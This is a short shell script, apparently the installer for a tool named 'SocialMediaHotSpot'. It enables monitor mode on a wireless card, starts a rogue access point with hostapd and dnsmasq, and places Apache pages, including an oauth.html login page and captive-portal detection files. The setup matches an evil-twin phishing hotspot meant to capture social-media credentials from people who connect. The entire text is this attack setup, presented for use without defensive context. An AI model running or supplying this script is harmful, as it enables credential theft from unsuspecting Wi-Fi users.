mv /root/SocialMediaHotSpot/hostapd.conf /root/hostapd.conf
mv /root/SocialMediaHotSpot/dnsmasq.conf /root/dnsmasq.conf
airmon-ng start wlan0
apt-get install hostapd
ifconfig wlan0mon up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
mv /root/SocialMediaHotSpot/000-default.conf /etc/apache2/sites-available/000-default.conf
mv /root/SocialMediaHotSpot/index.html /var/www/html/index.html
mv /root/SocialMediaHotSpot/hotspot-detect.html /var/www/html/hotspot-detect.html
mv /root/SocialMediaHotSpot/redirect /var/www/html/redirect
mv /root/SocialMediaHotSpot/static* /var/www/html/
mv /root/SocialMediaHotSpot/oauth.html /var/www/html/oauth.html
a2enmod php7.2
systemctl restart apache2
/etc/init.d/apache2 start
hostapd -B /root/hostapd.conf
dnsmasq -C /root/dnsmasq.conf
